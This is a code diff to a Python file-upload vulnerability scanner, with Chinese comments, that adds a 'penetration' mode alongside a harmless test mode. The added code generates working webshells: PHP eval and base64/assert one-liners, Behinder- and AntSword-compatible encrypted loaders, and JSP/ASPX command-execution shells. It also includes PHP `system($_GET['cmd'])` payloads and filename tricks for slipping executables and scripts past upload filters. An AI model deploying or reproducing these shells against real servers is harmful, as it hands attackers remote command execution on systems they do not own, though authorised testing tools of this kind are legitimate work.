@@ -55,7 +55,10 @@ class AsyncScanner:
                    progress_callback: Optional[Callable[[str, int], None]] = None,
                    timeout: int = 30,
                    use_raw_multipart: bool = True,
-                   use_fingerprint: bool = True) -> ScanResult:
+                   use_fingerprint: bool = True,
+                   selected_extensions: Optional[List[str]] = None,
+                   scan_mode: str = "security",  # 【新增】security / penetration
+                   webshell_config: Optional[dict] = None) -> ScanResult:  # 【新增】WebShell配置
         """执行扫描"""
         self.running = True
         start_time = datetime.now()
@@ -77,23 +80,16 @@ class AsyncScanner:
                     cookie_dict[k] = v
         
         # 创建HTTP客户端
-        if on_log_callback:
-            on_log_callback("正在创建HTTP客户端...")
         engine = AsyncHTTPClient(proxies=proxies, headers=headers, cookies=cookie_dict, timeout=timeout)
         engine.set_log_callback(on_traffic_callback)
         
         scan_result = ScanResult(target=target_url, start_time=start_time)
         self._traffic_cb = on_traffic_callback
-        self._traffic_update_cb = on_traffic_update_callback  # 【新增】用于 is_success 更新回调
+        self._traffic_update_cb = on_traffic_update_callback
+        self._on_result_callback = on_result_callback
+        self._on_finding_callback = on_finding_callback
         self._use_raw = False
         self._raw_client: Optional[RawHTTPClient] = None
-        
-        if on_log_callback:
-            on_log_callback(f"开始扫描: {target_url}")
-        
-        # 发送初始进度，避免看起来卡在0%
-        if progress_callback:
-            progress_callback("正在初始化扫描环境...", 0)
         
         upload_url = target_url
         extra_fields: Optional[dict] = None
@@ -192,7 +188,7 @@ class AsyncScanner:
         
         if on_log_callback:
             on_log_callback("正在生成payloads...")
-        raw_list = self._generate_payloads(None)
+        raw_list = self._generate_payloads(None, selected_extensions, scan_mode, webshell_config)
         if on_log_callback:
             on_log_callback(f"生成原始payloads: {len(raw_list)} 个")
         
@@ -231,13 +227,37 @@ class AsyncScanner:
         if progress_callback:
             progress_callback("正在初始化扫描...", 0)
         
+        # 【智能后缀判定】初始化后缀统计
+        ext_stats = {}  # {ext: {"success": 0, "total": 0, "max_confidence": 0.0}}
+        SKIP_CONFIDENCE_THRESHOLD = 0.85  # 置信度超过此值跳过后缀其他payload
+        MIN_PAYLOADS_BEFORE_SKIP = 3  # 每个后缀至少测试3个payload后再评估
+        
+        # 【新增】保存扫描模式配置
+        self._scan_mode = scan_mode
+        self._webshell_config = webshell_config or {"enabled": False}
+        
+        if on_log_callback:
+            on_log_callback(f"[模式] 测试模式: {'渗透测试' if scan_mode == 'penetration' else '安全测试'}")
+            if self._webshell_config.get("enabled"):
+                on_log_callback(f"[模式] WebShell密码: {self._webshell_config.get('password', '默认')}")
+                on_log_callback(f"[模式] Shell类型: {self._webshell_config.get('type', '基础')}")
+
+        # 统计每个后缀的payload数量
+        for p in payloads:
+            ext = p.get('ext', 'unknown')
+            if ext not in ext_stats:
+                ext_stats[ext] = {"success": 0, "total": 0, "max_confidence": 0.0}
+            ext_stats[ext]["total"] += 1
+
         # 【修复】定义进度更新间隔
         update_interval = max(1, min(5, total // 100))  # 至少每5个或每1%更新一次
 
+        # 收集需要跳过的后缀
+        skipped_exts = set()
+
         for i, payload in enumerate(payloads):
-            if on_log_callback:
-                on_log_callback(f"=== 开始第{i+1}个payload测试 ===")
-                on_log_callback(f"当前running状态: {self.running}")
+            if on_log_callback and i % 50 == 0:  # 每50个打印一次进度
+                on_log_callback(f"测试进度: {i+1}/{total}")
             
             if not self.running:
                 if on_log_callback:
@@ -253,14 +273,8 @@ class AsyncScanner:
                 # 强制刷新UI
                 if hasattr(progress_callback, '__self__') and hasattr(progress_callback.__self__, 'repaint'):
                     progress_callback.__self__.repaint()
-                
-            if on_log_callback:
-                on_log_callback(f"测试 {payload.get('desc', 'unknown')}")
 
             try:
-                if on_log_callback:
-                    on_log_callback(f"正在测试payload {i+1}/{total}: {payload.get('filename', 'unknown')}")
-                
                 # 添加超时保护，避免单个请求卡住整个扫描
                 result = await asyncio.wait_for(
                     self._test_payload(engine, upload_url, file_param, payload, inferred_upload_dir, extra_fields),
@@ -279,26 +293,62 @@ class AsyncScanner:
                             inferred_upload_dir = leaked.rsplit('/', 1)[0] if '/' in leaked else None
                         if inferred_upload_dir and on_log_callback:
                             on_log_callback(f"自动推断上传目录: {inferred_upload_dir}")
-
-                # 发送结果到回调（用于实时显示）
-                if result and on_result_callback:
-                    try:
-                        on_result_callback(result)
-                    except Exception as e:
-                        print(f"[AsyncScanner] 回调执行失败: {e}")
                 
+                # 【智能后缀判定】更新后缀统计并检查是否需要跳过后缀
+                ext = payload.get('ext', 'unknown')
+                if result:
+                    confidence = result.get('confidence', 0)
+                    is_success = result.get('is_success', False) or result.get('is_vulnerability', False)
+                    
+                    if ext in ext_stats:
+                        if confidence > ext_stats[ext]["max_confidence"]:
+                            ext_stats[ext]["max_confidence"] = confidence
+                        if is_success:
+                            ext_stats[ext]["success"] += 1
+                    
+                    # 检查是否需要跳过后缀的其他payload
+                    if ext not in skipped_exts and ext in ext_stats:
+                        stats = ext_stats[ext]
+                        # 只有在测试了足够多的payload后才评估
+                        if stats["total"] >= MIN_PAYLOADS_BEFORE_SKIP:
+                            # 计算当前后缀的成功率
+                            success_count = stats["success"]
+                            tested = stats["total"]
+                            current_conf = stats["max_confidence"]
+                            
+                            # 条件：置信度超过阈值 或 有明显的成功结果
+                            if current_conf >= SKIP_CONFIDENCE_THRESHOLD:
+                                skipped_exts.add(ext)
+                                if on_log_callback:
+                                    on_log_callback(f"[智能判定] .ext 置信度已达 {current_conf:.0%}，跳过后缀其他payload")
+                                if progress_callback:
+                                    progress_callback(f"[智能] .ext 后缀已确认，跳过剩余测试", current_progress)
+                            elif success_count >= 2:  # 有2个以上成功结果
+                                skipped_exts.add(ext)
+                                if on_log_callback:
+                                    on_log_callback(f"[智能判定] .ext 已获 {success_count} 个成功结果，跳过后缀其他payload")
+                
+                        # 【修复】漏洞检查必须在这里执行，不能在 continue 之后！
                 # 如果是漏洞发现
                 if result and result.get('is_vulnerability'):
                     finding = result.get('finding')
                     if finding:
                         scan_result.findings.append(finding)
                         scan_result.stats["vulns_found"] += 1
-                        if on_finding_callback:
-                            on_finding_callback(finding)
+                        print(f"[AsyncScanner] 发现漏洞: {finding.name}", flush=True)
+                        if self._on_finding_callback:
+                            self._on_finding_callback(finding)
                         if on_log_callback:
                             on_log_callback(f"[+] 发现漏洞: {finding.name}")
                 
                 scan_result.stats["total_requests"] += 1
+                
+                # 如果当前后缀已被标记为跳过，直接跳到下一个payload（漏洞检查已完成）
+                if ext in skipped_exts:
+                    remaining = sum(1 for p in payloads[i+1:] if p.get('ext') == ext)
+                    if remaining > 0 and on_log_callback:
+                        on_log_callback(f"[跳过] .ext 后缀已确认，跳过剩余 {remaining} 个payload")
+                    continue
                 
             except Exception as e:
                 if on_log_callback:
@@ -321,14 +371,17 @@ class AsyncScanner:
     async def _run_blocking(self, fn, *args):
         """在executor中运行阻塞函数"""
         loop = asyncio.get_running_loop()
-        
         # 【修复】添加超时保护，避免永久阻塞
-        result = await asyncio.wait_for(
-            loop.run_in_executor(None, lambda: fn(*args)),
-            timeout=30  # 最多等待30秒
-        )
-        
-        return result
+        try:
+            result = await asyncio.wait_for(
+                loop.run_in_executor(None, lambda: fn(*args)),
+                timeout=30  # 最多等待30秒
+            )
+            return result
+        except asyncio.CancelledError:
+            raise
+        except Exception as e:
+            raise
     
     async def _test_payload(self, 
                            engine: AsyncHTTPClient, 
@@ -381,16 +434,23 @@ class AsyncScanner:
                     content_type=content_type,
                     extra_data=extra_fields,
                 )
-        except Exception:
+        except Exception as e:
+            import traceback
+            traceback.print_exc()
             return None
         
         # 分析上传响应
         analysis = self.analyzer.analyze_upload_response(response, actual_filename)
         
-        # 【增强】安全的重定向跟进：302跳转到详情页时提取文件名
-        redirect_location = response.headers.get("location", "") or response.headers.get("Location", "")
+        # 如果分析结果为None，设置默认值
+        if analysis is None:
+            analysis = {'is_success': False, 'success_probability': 0, 'confidence_level': 'low', 
+                       'is_redirect': False, 'length': 0, 'decision_reasons': [], 'verify_filenames': [actual_filename]}
+        
         followed_redirect = False
         redirect_response = None
+        # 增强:安全的重定向跟进：302跳转到详情页时提取文件名
+        redirect_location = response.headers.get("location", "") or response.headers.get("Location", "")
         if 300 <= response.status_code < 400 and redirect_location:
             try:
                 # 只跟进一次，设置2秒超时避免卡住
@@ -405,11 +465,8 @@ class AsyncScanner:
                     redirect_server_filename = self.analyzer._extract_server_filename_from_html(redirect_response.text)
                     if redirect_server_filename and redirect_server_filename != actual_filename:
                         analysis['server_filename'] = redirect_server_filename
-            except asyncio.TimeoutError:
+            except:
                 pass
-            except Exception:
-                pass
-        
         # 格式化请求头和响应头
         if isinstance(response, ScanHttpResponse):
             # 【修复】从 raw_request 中提取真正的 HTTP 请求头和请求体
@@ -559,7 +616,6 @@ class AsyncScanner:
         
         # 限制验证URL数量，避免过多验证请求
         max_verify_urls = min(len(verification_urls), 3)
-        
         for idx, u in enumerate(verification_urls):
             if idx >= max_verify_urls:
                 break
@@ -584,19 +640,20 @@ class AsyncScanner:
                 result['verified_upload'] = True
                 result['path_leaked'] = result.get('path_leaked') or verification_url
                 result['verification_url'] = verification_url
+                # 【修复】设置 verification 字典供前端显示
+                result['verification'] = {'verified': True, 'status': 'success'}
 
                 if b"UploadForge_Test_Success_" in content:
                     if self.analyzer.analyze_execution_response(check_resp, "46"):
                         verified_execution = True
                         result['verified_execution'] = True
+                        result['verification']['execution_confirmed'] = True
 
                 if check_resp.content == content:
                     verified_upload = True
 
                 break
-            except asyncio.TimeoutError:
-                continue
-            except Exception:
+            except:
                 continue
         
         # 【修复】验证优先，但无法验证时保留高置信度分析结果
@@ -689,6 +746,14 @@ class AsyncScanner:
             if self._traffic_update_cb:
                 self._traffic_update_cb(_current_log.id, is_success)
         
+        # 发送结果到回调（用于实时显示）
+        callback = self._on_result_callback
+        if result and callback:
+            try:
+                callback(result)
+            except Exception:
+                pass
+        
         return result
     
     def _log_raw_traffic(
@@ -733,22 +798,195 @@ class AsyncScanner:
         self._traffic_cb(log)
         return log  # 【新增】返回 log 对象以便后续更新 is_success
     
-    def _generate_payloads(self, max_limit: Optional[int] = 200) -> List[dict]:
+    def _generate_harmless_content(self, lang: str, marker: str = "Test") -> bytes:
+        """生成安全模式下的纯文本内容（不含任何可执行代码）"""
+        from config import VERSION
+        content = f"""<!--
+    ================================================
+    UploadRanger Security Test File
+    ================================================
+    This file is generated by UploadRanger v{VERSION}
+    Only for security testing purposes
+    
+    Warning:
+    - This is a harmless content file
+    - No executable code is included
+    - For authorized security testing only
+    
+    Language: {lang}
+    Marker: {marker}
+    ================================================
+-->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>UploadRanger Security Test - {lang}</title>
+    <meta charset="utf-8">
+</head>
+<body>
+    <h1>UploadRanger Security Test File</h1>
+    <p>This file is generated by UploadRanger for security testing</p>
+    <p>Extension: {lang}</p>
+    <p>Marker: {marker}</p>
+    <hr>
+    <p><small>Generated by UploadRanger v{VERSION}</small></p>
+</body>
+</html>"""
+        return content.encode('utf-8')
+    
+    def _generate_php_webshell(self, password: str, shell_type: str = "基础eval") -> bytes:
+        """根据类型生成PHP WebShell"""
+        if shell_type == "基础eval":
+            return f"<?php @eval($_POST['{password}']); ?>".encode()
+        elif shell_type == "Base64免杀":
+            return f"<?php $c=base64_decode($_POST['{password}']);@assert($c); ?>".encode()
+        elif shell_type == "冰蝎兼容":
+            return f"""<?php
+@session_start();
+$key='{password}';
+$post=file_get_contents("php://input");
+if(!$post){{exit;}}
+$key=md5($key);
+$iv=md5(md5($key));
+$post=openssl_decrypt($post,"AES-128-CBC",$key,OPENSSL_RAW_DATA,$iv);
+$post=unserialize($post);
+$func=$post['func'];
+$param=$post['param'];
+$func($param);
+?>""".encode()
+        elif shell_type == "蚁剑兼容":
+            # 蚁剑标准一句话木马，使用默认密码 ant
+            return "<?php @eval($_POST['ant']); ?>".encode()
+        else:
+            return f"<?php @eval($_POST['{password}']); ?>".encode()
+    
+    def _generate_jsp_webshell(self, password: str, shell_type: str = "基础eval") -> bytes:
+        """根据类型生成JSP WebShell"""
+        if shell_type == "基础eval":
+            return f"""<%@ page import="java.io.*" %>
+<% if(request.getParameter("{password}")!=null) {{
+    String cmd=request.getParameter("{password}");
+    Process p=Runtime.getRuntime().exec(cmd);
+    BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String s;
+    while((s=br.readLine())!=null){{out.println(s);}}
+}} %>""".encode()
+        elif shell_type == "冰蝎兼容":
+            return f"""<%!
+class U extends ClassLoader{{U(ClassLoader c){{super(c);}}
+    public Class g(byte[] b){{return super.defineClass(b,0,b.length);}}
+}}
+%>
+<% String cls=request.getParameter("{password}");
+    if(cls!=null){{
+        new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext);
+    }}%>""".encode()
+        elif shell_type == "蚁剑兼容":
+            # 蚁剑JSP一句话木马
+            return f"""<%@ page import="java.io.*" %>
+<% if(request.getParameter("ant")!=null) {{
+    String cmd=request.getParameter("ant");
+    Process p=Runtime.getRuntime().exec(cmd);
+    BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String s;
+    while((s=br.readLine())!=null){{out.println(s);}}
+}} %>""".encode()
+        else:
+            return f"""<%@ page import="java.io.*" %>
+<% if(request.getParameter("{password}")!=null) {{
+    String cmd=request.getParameter("{password}");
+    Process p=Runtime.getRuntime().exec(cmd);
+    BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String s;
+    while((s=br.readLine())!=null){{out.println(s);}}
+}} %>""".encode()
+    
+    def _generate_aspx_webshell(self, password: str, shell_type: str = "基础eval") -> bytes:
+        """根据类型生成ASPX WebShell"""
+        if shell_type == "基础eval":
+            return f"""<%@ Page Language="C#"%>
+<%if(Request["{password}"]!=null){{
+    System.Diagnostics.Process p=new System.Diagnostics.Process();
+    p.StartInfo.FileName=Request["{password}"];
+    p.StartInfo.UseShellExecute=false;
+    p.StartInfo.RedirectStandardOutput=true;
+    p.Start();
+    Response.Write(p.StandardOutput.ReadToEnd());
+}}%>""".encode()
+        elif shell_type == "冰蝎兼容":
+            return f"""<%@ Page Language="C#" validateRequest="false" %>
+<% System.Reflection.Assembly.Load(Request.BinaryRead(Request.ContentLength)).CreateInstance("U").Equals(Request.Form["{password}"]); %>""".encode()
+        elif shell_type == "蚁剑兼容":
+            # 蚁剑ASPX一句话木马
+            return f"""<%@ Page Language="C#"%>
+<%if(Request["ant"]!=null){{
+    System.Diagnostics.Process p=new System.Diagnostics.Process();
+    p.StartInfo.FileName=Request["ant"];
+    p.StartInfo.UseShellExecute=false;
+    p.StartInfo.RedirectStandardOutput=true;
+    p.Start();
+    Response.Write(p.StandardOutput.ReadToEnd());
+}}%>""".encode()
+        else:
+            return f"""<%@ Page Language="C#"%>
+<%if(Request["{password}"]!=null){{
+    System.Diagnostics.Process p=new System.Diagnostics.Process();
+    p.StartInfo.FileName=Request["{password}"];
+    p.StartInfo.UseShellExecute=false;
+    p.StartInfo.RedirectStandardOutput=true;
+    p.Start();
+    Response.Write(p.StandardOutput.ReadToEnd());
+}}%>""".encode()
+    
+    def _generate_payloads(self, max_limit: Optional[int] = 200, selected_extensions: Optional[List[str]] = None, 
+                          scan_mode: str = "security", webshell_config: Optional[dict] = None) -> List[dict]:
         """生成测试 payloads；max_limit 为 None 时返回完整列表（供指纹过滤后再截断）。
 
         【BUG-2/3/10修复】调整顺序：高价值绕过扩展名优先；删除与批量section重叠的硬编码列表；
         大小写绕过仅对真正受黑名单限制的扩展名（php/asp/aspx/jsp）生成。
+        
+        Args:
+            max_limit: 最大payload数量限制
+            selected_extensions: 用户选择的后缀列表，如 [".php", ".phtml", ".asp"]
+            scan_mode: 扫描模式 - security(安全测试) / penetration(渗透测试)
+            webshell_config: WebShell配置 {'enabled': True, 'password': 'xxx', 'type': 'xxx'}
         """
         payloads = []
+        
+        # 获取扫描模式配置
+        is_penetration = scan_mode == "penetration"
+        shell_pwd = (webshell_config or {}).get("password", "UploadRanger") if is_penetration else "test"
+        shell_type = (webshell_config or {}).get("type", "基础eval") if is_penetration else ""
+        
+        # 解析用户选择的后缀（去掉点号）
+        if selected_extensions:
+            selected_exts_clean = [ext.lstrip('.') for ext in selected_extensions]
+        else:
+            selected_exts_clean = None  # None表示全部允许
+
+        # 根据模式选择内容
+        from config import VERSION
+        if is_penetration:
+            # 渗透测试模式 - 使用WebShell内容
+            php_content = self._generate_php_webshell(shell_pwd, shell_type)
+            jsp_content = self._generate_jsp_webshell(shell_pwd, shell_type)
+            aspx_content = self._generate_aspx_webshell(shell_pwd, shell_type)
+        else:
+            # 安全测试模式 - 使用纯文本内容（不含可执行代码）
+            php_content = self._generate_harmless_content("PHP", f"UploadRanger v{VERSION}")
+            jsp_content = self._generate_harmless_content("JSP", f"UploadRanger v{VERSION}")
+            aspx_content = self._generate_harmless_content("ASP.NET", f"UploadRanger v{VERSION}")
 
         # 1. 标准WebShell
-        php_content = b"<?php echo 'UploadForge_Test_Success_' . (23 * 2); ?>"
-        jsp_content = b"<% out.println(\"UploadForge_Test_Success_\" + (23 * 2)); %>"
-        aspx_content = b'<%@ Page Language="C#" %> <% Response.Write("UploadForge_Test_Success_" + (23 * 2)); %>'
+        # 注意：安全测试模式下，这些也会生成但内容是无害的
 
-        payloads.append({"type": "php_shell", "ext": "php", "content": php_content, "desc": "标准PHP Shell"})
-        payloads.append({"type": "jsp_shell", "ext": "jsp", "content": jsp_content, "desc": "标准JSP Shell"})
-        payloads.append({"type": "aspx_shell", "ext": "aspx", "content": aspx_content, "desc": "标准ASPX Shell"})
+        # 只添加用户选择的后缀
+        if selected_exts_clean is None or 'php' in selected_exts_clean:
+            payloads.append({"type": "php_shell", "ext": "php", "content": php_content, "desc": "标准PHP Shell"})
+        if selected_exts_clean is None or 'jsp' in selected_exts_clean:
+            payloads.append({"type": "jsp_shell", "ext": "jsp", "content": jsp_content, "desc": "标准JSP Shell"})
+        if selected_exts_clean is None or 'aspx' in selected_exts_clean:
+            payloads.append({"type": "aspx_shell", "ext": "aspx", "content": aspx_content, "desc": "标准ASPX Shell"})
 
         # 1.5 【新增】MIME类型伪造 - 专门针对只检查$_FILES['type']的PHP漏洞
         # 保持恶意扩展名，但伪造Content-Type为图片类型
@@ -872,7 +1110,7 @@ class AsyncScanner:
             "desc": "NTFS备用数据流 shell.php::$DATA"
         })
         
-        # 10. 分号绕过 (IIS) - 【新增】更多变体
+        # 10. 分号绕过 (IIS)
         payloads.append({
             "type": "semicolon_bypass",
             "ext": "php",
@@ -888,22 +1126,23 @@ class AsyncScanner:
             "desc": "分号绕过 (IIS) shell.jsp;.jpg"
         })
         
-        # 11. 【新增】.htaccess 攻击
-        htaccess_content = b"AddType application/x-httpd-php .jpg .png .gif\n"
-        payloads.append({
-            "type": "htaccess_attack",
-            "ext": "htaccess",
-            "filename": ".htaccess",
-            "content": htaccess_content,
-            "desc": ".htaccess 文件攻击"
-        })
+        # 11. 【删除】.htaccess 覆盖攻击已移除（安全风险）
         
-        # 12. 【新增】文件包含 payload
-        include_payloads = [
-            ("shell.php.txt", b"<?php system($_GET['cmd']); ?>"),
-            ("config.php.bak", b"<?php system($_GET['cmd']); ?>"),
-            ("index.php~", b"<?php system($_GET['cmd']); ?>"),
-        ]
+        # 12. 文件包含 payload（安全模式为纯文本，渗透模式为真实内容）
+        from config import VERSION
+        safe_include_content = f"<!-- Security Test File - UploadRanger v{VERSION} -->"
+        if is_penetration:
+            include_payloads = [
+                ("shell.php.txt", b"<?php system($_GET['cmd']); ?>"),
+                ("config.php.bak", b"<?php system($_GET['cmd']); ?>"),
+                ("index.php~", b"<?php system($_GET['cmd']); ?>"),
+            ]
+        else:
+            include_payloads = [
+                ("shell.php.txt", safe_include_content.encode()),
+                ("config.php.bak", safe_include_content.encode()),
+                ("index.php~", safe_include_content.encode()),
+            ]
         for filename, content in include_payloads:
             payloads.append({
                 "type": "file_include",
@@ -923,13 +1162,114 @@ class AsyncScanner:
                 "desc": f"ASP变体 .{ext}"
             })
 
+        # 13.5 Windows可执行文件上传测试
+        # 安全模式：纯文本内容；渗透模式：PE文件头
+        from config import VERSION
+        if is_penetration:
+            pe_header = b"MZ" + b"\x00" * 58 + b"PE\x00\x00" + b"\x00" * 20
+            exe_content = pe_header + f"<!-- UploadRanger v{VERSION} -->".encode()
+        else:
+            exe_content = f"<!-- Security Test File (EXE Placeholder) - UploadRanger v{VERSION} -->".encode()
+        
+        # Windows可执行文件扩展名
+        exe_exts = [
+            ("exe", "Windows可执行文件"),
+            ("scr", "屏幕保护程序"),
+            ("pif", "程序信息文件"),
+            ("com", "DOS可执行文件"),
+            ("dll", "动态链接库"),
+        ]
+        
+        for ext, desc in exe_exts:
+            payloads.append({
+                "type": f"windows_executable_{ext}",
+                "ext": ext,
+                "content": exe_content,
+                "desc": f"Windows {desc} .{ext}"
+            })
+            # 双扩展名绕过
+            payloads.append({
+                "type": f"windows_executable_{ext}_double",
+                "ext": ext,
+                "filename": f"shell.{ext}.jpg",
+                "content": exe_content,
+                "desc": f"Windows {desc} 双扩展名 .{ext}.jpg",
+                "fake_content_type": "image/jpeg"
+            })
+            # 空字节绕过
+            payloads.append({
+                "type": f"windows_executable_{ext}_null",
+                "ext": ext,
+                "filename": f"shell.{ext}%00.jpg",
+                "content": exe_content,
+                "desc": f"Windows {desc} 空字节 .{ext}%00.jpg",
+                "fake_content_type": "image/jpeg"
+            })
+            # 尾部点号（Windows特性）
+            payloads.append({
+                "type": f"windows_executable_{ext}_dot",
+                "ext": ext,
+                "filename": f"shell.{ext}.",
+                "content": exe_content,
+                "desc": f"Windows {desc} 尾部点号 .{ext}.",
+            })
+            # ADS备用数据流
+            payloads.append({
+                "type": f"windows_executable_{ext}_ads",
+                "ext": ext,
+                "filename": f"shell.{ext}::$DATA",
+                "content": exe_content,
+                "desc": f"Windows {desc} ADS .{ext}::$DATA",
+            })
+        
+        # Windows脚本文件（安全模式：纯文本；渗透模式：真实脚本）
+        if is_penetration:
+            bat_content = b"@echo off\r\necho UploadRanger_Penetration_Test\r\n"
+            ps1_content = b"Write-Output 'UploadRanger_PS1_Test'\r\n"
+            vbs_content = b"WScript.Echo \"UploadRanger_VBS_Test\"\r\n"
+        else:
+            bat_content = f"@REM Security Test Script - UploadRanger v{VERSION}\r\n@REM This is a harmless test file\r\n".encode()
+            ps1_content = f"# Security Test Script - UploadRanger v{VERSION}\r\n# This is a harmless test file\r\n".encode()
+            vbs_content = f"' Security Test Script - UploadRanger v{VERSION}\r\n' This is a harmless test file\r\n".encode()
+        
+        script_payloads = [
+            ("bat", bat_content, "批处理文件"),
+            ("cmd", bat_content, "命令脚本"),
+            ("ps1", ps1_content, "PowerShell脚本"),
+            ("vbs", vbs_content, "VBScript"),
+            ("js", (b"// UploadRanger_JS_Test" if is_penetration else f"// Security Test Script - UploadRanger v{VERSION}".encode()), "JScript"),
+            ("hta", (b"<script>alert('UploadRanger_HTA_Test')</script>" if is_penetration else f"<!-- Security Test File - UploadRanger v{VERSION} -->".encode()), "HTML应用程序"),
+            ("wsf", (b"<job><script language=\"JScript\">WScript.Echo('UploadRanger_WSF_Test')</script></job>" if is_penetration else f"<!-- Security Test File - UploadRanger v{VERSION} -->".encode()), "Windows脚本文件"),
+        ]
+        
+        for ext, content, desc in script_payloads:
+            if isinstance(content, bytes):
+                pass
+            else:
+                content = content.encode()
+            payloads.append({
+                "type": f"windows_script_{ext}",
+                "ext": ext,
+                "content": content,
+                "desc": f"Windows {desc} .{ext}"
+            })
+            # 双扩展名绕过
+            payloads.append({
+                "type": f"windows_script_{ext}_double",
+                "ext": ext,
+                "filename": f"shell.{ext}.txt",
+                "content": content,
+                "desc": f"Windows {desc} 双扩展名 .{ext}.txt",
+                "fake_content_type": "text/plain"
+            })
+
         # 14. 扩展：批量绕过变体（用于把"Payload上限"真正变成"可扩展的词库"）
+        # 【删除】压缩包相关已移除（zip、rar、7z、tar、gz、bz2）
         safe_exts = [
             "jpg", "jpeg", "png", "gif", "bmp", "webp", "ico", "svg",
             "txt", "log", "csv", "json", "xml", "yml", "yaml", "ini",
             "html", "htm", "css", "js", "map",
             "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx",
-            "zip", "rar", "7z", "tar", "gz", "bz2",
             "mp3", "mp4", "avi", "mov",
         ]
         # 【BUG-2修复】黑名单外的高效绕过扩展名排在前面，.php/.asp等常见黑名单排在后面
@@ -1051,19 +1391,28 @@ class AsyncScanner:
                     continue
                 seen_filenames.add(fn)
             deduped.append(p)
+        
+        # 【新增】根据用户选择的后缀过滤payloads
+        if selected_exts_clean is not None:
+            filtered: List[dict] = []
+            for p in deduped:
+                payload_ext = p.get("ext", "")
+                # 检查payload的扩展名是否在用户选择的后缀中
+                # 或者扩展名在恶意变体列表中（会被二次扩展名绕过使用）
+                malicious_variants_exts = {"php", "phtml", "pht", "phar", "php3", "php4", "php5", "php7", 
+                                           "asp", "aspx", "asa", "cer", "cdx", "ashx", "asmx", "asax",
+                                           "jsp", "jspx", "jspf", "jhtml", "pl", "cgi", "py"}
+                if payload_ext in selected_exts_clean or payload_ext in malicious_variants_exts:
+                    filtered.append(p)
+            deduped = filtered
 
         if max_limit is not None:
             return deduped[:max_limit]
         return deduped
     
     def stop(self):
-        """停止扫描 - 增强版本"""
-        if self.running:
-            print("[AsyncScanner] 正在停止扫描...")
-            self.running = False
-            print("[AsyncScanner] 扫描已标记为停止状态")
-        else:
-            print("[AsyncScanner] 扫描已不在运行状态")
+        """停止扫描"""
+        self.running = False
 
 
 _BUILTIN_ASYNC_PAYLOAD_COUNT: Optional[int] = None
